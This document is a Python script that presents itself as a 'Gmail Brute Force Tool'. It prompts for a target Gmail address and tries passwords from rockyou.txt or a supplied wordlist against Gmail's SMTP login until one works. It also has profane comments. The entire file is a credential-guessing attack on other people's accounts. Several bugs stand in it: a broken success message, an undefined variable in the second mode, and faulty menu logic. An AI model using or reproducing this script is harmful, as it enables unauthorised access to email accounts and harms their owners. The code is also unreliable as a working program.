import os 
import smtplib 
import random , sys 
import colorama 
from colorama import Fore , Back , Style
import time 


error = "1","2","3","4","5","6","7","8","9","0"

#ငါ လိုး မ သား မ ခိုး နဲ့
# လီး ပဲ ရ မယ်

banner = """
 ▄▄▄▄    █    ██  ██▓     ██▓   ▓██   ██▓
▓█████▄  ██  ▓██▒▓██▒    ▓██▒    ▒██  ██▒
▒██▒ ▄██▓██  ▒██░▒██░    ▒██░     ▒██ ██░
▒██░█▀  ▓▓█  ░██░▒██░    ▒██░     ░ ▐██▓░
░▓█  ▀█▓▒▒█████▓ ░██████▒░██████▒ ░ ██▒▓░
░▒▓███▀▒░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░  ██▒▒▒ 
▒░▒   ░ ░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░▓██ ░▒░ 
 ░    ░  ░░░ ░ ░   ░ ░     ░ ░   ▒ ▒ ░░  
 ░         ░         ░  ░    ░  ░░ ░     
      ░                          ░ ░     
"""

def tt():
    message = "\tDeveloped By ACE\n\tGmail Brute Force Tool\n\tEducation and White hat Hacking\n\n"
    
    text = message
    
    for char in text:
        sys.stdout.write(char)   
        sys.stdout.flush()       
        time.sleep(0.05)         
    
    print()  


r = Fore.RED 
b = Fore.BLUE 

def conn():
    global smtp
    Gmailport = "587"
    
    smtp = smtplib.SMTP("smtp.gmail.com", Gmailport)
    smtp.ehlo()
    smtp.starttls()
    
def ckeck():
    print(b,banner)
    tt()
    global gmail
    gmail = input("\nEnter Target Gmail : ")
    if gmail.startswith(error):
        fail()
        
    else:
        success()
        
        
def fail():
    print("Invalid Gmail")
    
    
def success():
    
    wl = {
        "1":"Build in wordlist (rockyou.txt)",
        "2":"Own File",
    }
    
    for key,value in wl.items():
        print(f"\n[{key}] : {value}")
        
    command = input("\nEnter switch : ")
    if command == "1":
        one()
        
    if command == "2":
        two()
        
    else:
        exit("L E E")
        
def one():
    passwordfile = "rockyou.txt"
    
    try:
        pw = open(passwordfile,"r")
        
    except:
        exit("E R R O r")
    
    print(r+"Build In File is rockyou.txt (2025 list)")
    
    for password in pw:
        try:
            smtp.login(gmail , password)
            print("[✓] Password Found " % password)
            break
            
        except smtplib.SMTPAuthenticationError:
            print("[×] Password wrong %s " % password)
            
def two():
    passwordfile = input("File part : ")
    try:
        pw = open(passwordfile,"r")
        
    except:
        exit("E R R O r")
        
    for password in pw:
        try:
            smtp.login(user , password)
            print("[✓] Password Found " % password)
            break
            
        except smtplib.SMTPAuthenticationError:
            print("[×] Password wrong %s " % password)
    
                
def main():
    conn()
    ckeck()
    
main()